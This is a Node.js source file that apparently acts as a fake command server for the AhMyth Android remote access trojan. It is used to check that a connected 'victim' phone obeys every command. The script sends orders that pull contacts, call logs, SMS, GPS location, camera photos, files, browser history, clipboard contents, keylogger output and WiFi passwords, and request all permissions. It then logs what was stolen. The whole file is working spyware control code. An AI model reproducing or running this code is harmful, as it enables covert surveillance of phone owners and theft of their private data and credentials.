/**
 * AhMyth Fake Server - Pretends to be the Electron app
 * Tests ALL functions by sending commands to real phone
 */

const http = require('http');
const socketio = require('socket.io');

const PORT = 1234;
const server = http.createServer();
const io = socketio(server, {
    cors: { origin: "*" },
    pingTimeout: 60000,
    pingInterval: 25000
});

// All commands to test
const TESTS = [
    { order: 'x0000di', name: 'Device Info' },
    { order: 'x0000cn', name: 'Contacts' },
    { order: 'x0000cl', name: 'Call Logs' },
    { order: 'x0000sm', extra: 'ls', name: 'SMS List' },
    { order: 'x0000lo', name: 'Location' },
    { order: 'x0000ca', extra: '0', name: 'Front Camera' },
    { order: 'x0000ca', extra: '1', name: 'Back Camera' },
    { order: 'x0000fm', extra: '/storage/emulated/0/', name: 'File Manager' },
    { order: 'x0000ua', name: 'Installed Apps' },
    { order: 'x0000bh', name: 'Browser History' },
    { order: 'x0000cb', name: 'Clipboard' },
    { order: 'x0000kl', name: 'Keylogger' },
    { order: 'x0000wp', name: 'WiFi Passwords' },
    { order: 'x0000rp', permission: 'all', name: 'Request Permissions' },
];

let currentTest = 0;
let results = [];
let victimSocket = null;

console.log('╔══════════════════════════════════════════════════════════════╗');
console.log('║        AhMyth FAKE SERVER - Function Tester                  ║');
console.log('╚══════════════════════════════════════════════════════════════╝\n');

server.listen(PORT, () => {
    console.log(`[✓] Server listening on port ${PORT}`);
    console.log('[i] Waiting for phone to connect...\n');
    console.log('[!] Restart the app on phone or wait for reconnect\n');
});

io.on('connection', (socket) => {
    const query = socket.handshake.query;
    
    console.log('═══════════════════════════════════════════════════════════════');
    console.log('[✓] PHONE CONNECTED!');
    console.log(`    Model: ${query.model}`);
    console.log(`    Manufacturer: ${query.manf}`);
    console.log(`    Android: ${query.release}`);
    console.log(`    Device ID: ${query.id}`);
    console.log(`    Battery: ${query.battery}%`);
    console.log(`    Operator: ${query.operator}`);
    console.log('═══════════════════════════════════════════════════════════════\n');
    
    victimSocket = socket;
    
    // Set up listeners for all response types
    TESTS.forEach(test => {
        socket.on(test.order, (data) => {
            handleResponse(test, data);
        });
    });
    
    // Start testing after short delay
    setTimeout(() => runNextTest(), 2000);
    
    socket.on('disconnect', () => {
        console.log('\n[!] Phone disconnected');
        printResults();
    });
});

function runNextTest() {
    if (currentTest >= TESTS.length) {
        console.log('\n[✓] All tests completed!\n');
        printResults();
        return;
    }
    
    const test = TESTS[currentTest];
    console.log(`\n[${currentTest + 1}/${TESTS.length}] Testing: ${test.name}`);
    console.log(`    → Sending: ${test.order}${test.extra ? ' (' + test.extra + ')' : ''}`);
    
    const payload = { order: test.order };
    if (test.extra) payload.extra = test.extra;
    if (test.permission) payload.permission = test.permission;
    
    test.startTime = Date.now();
    
    victimSocket.emit('order', payload);
    
    // Timeout for this test
    setTimeout(() => {
        if (results.length === currentTest) {
            // No response received
            results.push({
                name: test.name,
                status: 'TIMEOUT',
                duration: 15000,
                size: 0,
                details: 'No response in 15s'
            });
            console.log('    ← [✗] TIMEOUT - No response');
            currentTest++;
            runNextTest();
        }
    }, 15000);
}

function handleResponse(test, data) {
    const duration = Date.now() - (test.startTime || Date.now());
    const dataStr = JSON.stringify(data);
    const size = dataStr.length;
    
    let status = 'SUCCESS';
    let details = '';
    
    // Analyze response
    if (data === null || data === undefined) {
        status = 'NULL';
        details = 'Null response';
    } else if (data.error) {
        status = 'ERROR';
        details = data.error.substring(0, 50);
    } else if (data.image === false) {
        status = 'FAILED';
        details = data.error || 'Camera failed';
    } else if (Array.isArray(data)) {
        details = `${data.length} items`;
        if (data.length === 0) status = 'EMPTY';
    } else if (data.image) {
        status = 'SUCCESS';
        const imgLen = typeof data.image === 'string' ? data.image.length : (data.image.length || 'binary');
        details = `Image received: ${imgLen} bytes`;
    } else if (data.history !== undefined) {
        details = `History: ${data.history?.length || 0}, Bookmarks: ${data.bookmarks?.length || 0}`;
        if (data.history?.length === 0 && data.bookmarks?.length === 0) status = 'EMPTY';
    } else if (data.logs !== undefined) {
        details = `${data.logs?.length || 0} keylog entries`;
    } else if (data.lat !== undefined) {
        status = 'SUCCESS';
        details = `Lat: ${data.lat}, Lng: ${data.lng}`;
    } else if (typeof data === 'object') {
        const keys = Object.keys(data);
        details = `Keys: ${keys.slice(0, 5).join(', ')}`;
    }
    
    results.push({
        name: test.name,
        status: status,
        duration: duration,
        size: size,
        details: details
    });
    
    const icon = status === 'SUCCESS' ? '✓' : status === 'EMPTY' ? '○' : '✗';
    console.log(`    ← [${icon}] ${status} (${duration}ms, ${size} bytes)`);
    if (details) console.log(`       ${details}`);
    
    // Show sample data for some responses
    if (test.order === 'x0000di' && data) {
        console.log(`       Device: ${data.model || 'N/A'}, IMEI: ${data.imei || 'N/A'}`);
    }
    if (test.order === 'x0000lo' && data.lat) {
        console.log(`       📍 https://maps.google.com/?q=${data.lat},${data.lng}`);
    }
    
    currentTest++;
    setTimeout(() => runNextTest(), 1500);
}

function printResults() {
    console.log('\n╔══════════════════════════════════════════════════════════════╗');
    console.log('║                    FINAL TEST RESULTS                        ║');
    console.log('╠══════════════════════════════════════════════════════════════╣');
    
    let success = 0, failed = 0, empty = 0, timeout = 0, errors = 0;
    
    results.forEach(r => {
        const icon = r.status === 'SUCCESS' ? '✓' : 
                     r.status === 'EMPTY' ? '○' : 
                     r.status === 'TIMEOUT' ? '⏱' : '✗';
        console.log(`║ [${icon}] ${r.name.padEnd(20)} ${r.status.padEnd(8)} ${(r.duration + 'ms').padStart(8)} ║`);
        
        if (r.status === 'SUCCESS') success++;
        else if (r.status === 'EMPTY') empty++;
        else if (r.status === 'TIMEOUT') timeout++;
        else if (r.status === 'ERROR') errors++;
        else failed++;
    });
    
    console.log('╠══════════════════════════════════════════════════════════════╣');
    console.log(`║  ✓ SUCCESS: ${success}   ○ EMPTY: ${empty}   ✗ FAILED: ${failed + errors}   ⏱ TIMEOUT: ${timeout}  ║`);
    console.log('╚══════════════════════════════════════════════════════════════╝\n');
    
    setTimeout(() => process.exit(0), 3000);
}

// Handle Ctrl+C
process.on('SIGINT', () => {
    console.log('\n[!] Interrupted');
    printResults();
    process.exit(0);
});

